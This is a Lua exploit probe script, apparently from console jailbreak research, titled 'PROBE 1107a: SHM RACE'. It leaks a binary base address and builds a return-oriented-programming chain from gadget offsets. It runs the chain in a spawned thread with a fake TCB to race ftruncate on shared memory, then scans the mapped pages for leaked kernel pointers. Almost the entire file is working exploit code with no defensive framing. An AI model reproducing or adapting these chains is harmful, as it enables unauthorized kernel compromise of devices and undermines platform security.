-- CRASH_CLASS: HIGH
-- PROBE 1107a: SHM ftruncate using 384b's EXACT working pattern
--
-- 384b works: clean output, all chains execute. Differences from 110x:
-- 1. 384b uses wq() with uint64, not wd() dword pairs
-- 2. 384b uses memory.alloc() for stack, not GPU mmap
-- 3. 384b uses g_bare_ret as start_func
-- 4. 384b uses thr_exit(431) to end the chain
--
-- This probe copies 384b's pattern exactly, substituting ftruncate.

print("=== PROBE 1107a: SHM RACE (384b PATTERN) ===")
print("")

local function N(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function mk(n)
    local t = {}; for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = n; setmetatable(t, getmetatable(syscall.pipe)); return t
end
local function rd(a)
    local ok, v = pcall(function() return memory.read_dword(a) end)
    if ok then return N(v) end return nil
end
local function rq(a)
    local ok, v = pcall(function() return memory.read_qword(a) end)
    if ok then return v end return nil
end
local function wd(a, v) pcall(function() memory.write_dword(a, v) end) end
local function wq(a, v) pcall(function() memory.write_qword(a, v) end) end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, N(val)
end
local function fmt(val)
    if val == nil then return "nil" end
    local h, l = get_hi_lo(val)
    if h < 0 then h = h + 0x100000000 end
    if l < 0 then l = l + 0x100000000 end
    return string.format("0x%08X%08X", h, l)
end

local stub = syscall.pipe.fn_addr
print("fn_addr=" .. fmt(stub))
local pid_val = N(native.fcall_with_rax(stub, 20))
print("pid=" .. pid_val)
local function alive() return N(native.fcall_with_rax(stub, 20)) == pid_val end

local ib = memory.alloc(0x200)
wd(N(ib), 0x160)
pcall(function() mk(593)(uint64(0), ib) end)
local elo = rd(N(ib) + 0x108) or 0
local ehi = rd(N(ib) + 0x10C) or 0
if elo < 0 then elo = elo + 0x100000000 end
if ehi < 0 then ehi = ehi + 0x100000000 end
local eb = uint64(string.format("0x%X%08X", ehi, elo))
print("eboot=" .. fmt(eb))

local g_pop_rax = eb + 0x992
local g_pop_rdi = eb + 0xC9DFE
local g_pop_rsi = eb + 0xD77D
local g_bare_ret = eb + 0x42
local g_mov_m_rax = eb + 0x92C67

local sc477 = mk(477)
local sc480 = mk(480)
local sc482 = mk(482)

local LARGE = 0x40000
local SMALL = 0x4000

-- [A] SHM setup
print("[A] SHM setup")
local shm_fd = N(sc482(uint64(1), uint64(0x602), uint64(0x1FF)))
print("shm_fd=" .. shm_fd)

N(sc480(uint64(shm_fd), uint64(LARGE)))
local map = sc477(uint64(0), uint64(LARGE), uint64(3), uint64(1), uint64(shm_fd), uint64(0))
local map_n = N(map)
print("map=" .. fmt(map))

for p = 0, 15 do
    wd(map_n + p * 0x4000, 0xAA000000 + p)
    wd(map_n + p * 0x4000 + 4, 0xBB000000 + p)
end

-- Fake TCB (same as 384b section H)
local tcb = memory.alloc(0x1000)
local tcb_a = N(tcb)
for i = 0, 0xFFC, 4 do wd(tcb_a + i, 0) end
for i = 0, 0xFF8, 8 do wq(tcb_a + i, uint64(tcb_a)) end
local fs_ptr = memory.alloc(8)
wq(N(fs_ptr), uint64(tcb_a))

-- Result slots
local res_ft = memory.alloc(8); wq(N(res_ft), uint64(0xBAD1BAD1))

-- [B] Build chain using 384b pattern: memory.alloc stack + wq + bare_ret
print("[B] building chain (384b pattern)")

local stk = memory.alloc(0x8000)
local sb = N(stk)
local ss = 0x4000
local rsp = sb + ss - ((sb + ss) % 16) - 8

local off = 0
local function emit(v) wq(rsp + off, v); off = off + 8 end

-- Phase 0: sysarch(129, &tcb) — fix TLS
emit(g_pop_rdi);       emit(uint64(129))
emit(g_pop_rsi);       emit(uint64(N(fs_ptr)))
emit(g_pop_rax);       emit(uint64(165))
emit(stub)

-- Phase 1: ftruncate(shm_fd, SMALL)
emit(g_pop_rdi);       emit(uint64(shm_fd))
emit(g_pop_rsi);       emit(uint64(SMALL))
emit(g_pop_rax);       emit(uint64(480))
emit(stub)
-- save result
emit(g_pop_rdi);       emit(uint64(N(res_ft)))
emit(g_mov_m_rax)

-- Phase 2: ftruncate(shm_fd, LARGE)
emit(g_pop_rdi);       emit(uint64(shm_fd))
emit(g_pop_rsi);       emit(uint64(LARGE))
emit(g_pop_rax);       emit(uint64(480))
emit(stub)

-- Phase 3: exit
emit(g_pop_rdi);       emit(uint64(0))
emit(g_pop_rax);       emit(uint64(431))
emit(stub)

print(string.format("  %d qwords (%d bytes)", off / 8, off))

-- thr_param (384b pattern)
local par = memory.alloc(0x40)
local pa = N(par)
for i = 0, 0x3C, 4 do wd(pa + i, 0) end
wq(pa, g_bare_ret)                     -- start_func = bare ret
wq(pa + 8, uint64(0))                  -- arg = 0
wq(pa + 0x10, uint64(sb))              -- stack_base
wq(pa + 0x18, uint64(ss))              -- stack_size
local tid = memory.alloc(8); wq(N(tid), uint64(0))
wq(pa + 0x30, tid)

-- [C] Spawn
print("[C] spawning")
print("pre-thr_new")
local ok1, rv1 = pcall(function() return mk(455)(par, uint64(0x38)) end)
print("post-thr_new ok=" .. tostring(ok1) .. " ret=" .. (ok1 and N(rv1) or -999))

for w = 1, 25000 do local _ = rd(sb) end
print("wait done")

if not alive() then print("DEAD"); return end
print("alive=true")

-- [D] Results
print("")
print("[D] results")
local ft_raw = rq(N(res_ft))
local fth, ftl = get_hi_lo(ft_raw)
print(string.format("ftruncate(SMALL) ret: raw=%s val=%d", fmt(ft_raw), ftl))

-- Check pages: after trunc to SMALL then back to LARGE
-- pages 1-15 should be zeroed (re-expanded)
print("")
print("[E] reading pages")
for pg = 0, 15 do
    local ok2, val = pcall(function()
        return memory.read_qword(uint64(map_n + pg * 0x4000))
    end)
    if ok2 and val then
        local h, l = get_hi_lo(val)
        if h < 0 then h = h + 0x100000000 end
        if l < 0 then l = l + 0x100000000 end
        local tag = ""
        if h >= 0xFFFF8000 and h ~= 0xFFFFFFFF then tag = " *** KPTR ***" end
        if h == 0 and l == 0 then tag = " (zero)" end
        if l == (0xAA000000 + pg) and h == (0xBB000000 + pg) then tag = " (sentinel)" end
        print(string.format("  page %d: 0x%08X%08X%s", pg, h, l, tag))
    else
        print(string.format("  page %d: FAIL", pg))
    end
end

print("")
print("alive=" .. tostring(alive()))
print("=== PROBE 1107a COMPLETE ===")
